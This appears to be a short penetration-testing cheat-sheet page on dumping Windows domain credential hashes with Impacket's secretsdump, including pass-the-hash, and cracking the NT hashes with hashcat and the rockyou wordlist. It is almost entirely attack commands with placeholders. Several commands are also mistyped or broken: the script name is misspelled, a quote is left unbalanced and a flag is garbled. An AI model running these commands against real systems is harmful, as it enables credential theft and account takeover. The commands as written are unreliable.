# Dumping And Cracking Hashes

```
secretsdump.py <domainname>/<userer>:'<pswd>@<ip>
```

for hash

```
secretdumps.py <user>@<ip> -hashes <>
```

Cracking hashes

For Cracking hashes we only need NT portion not lm

eamplex-

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption><p>The Secound part of the hash</p></figcaption></figure>

Save that hash into a text file&#x20;

```
hashcat --help | grep <hash type>
```

Then we get an number

```
hashcat -m <the number> <filename> /usr/share/wordlists/rockyou.txt
```

```
hashcat -m <the number> <filename> /usr/share/wordlists/rockyou.txt --showc
```
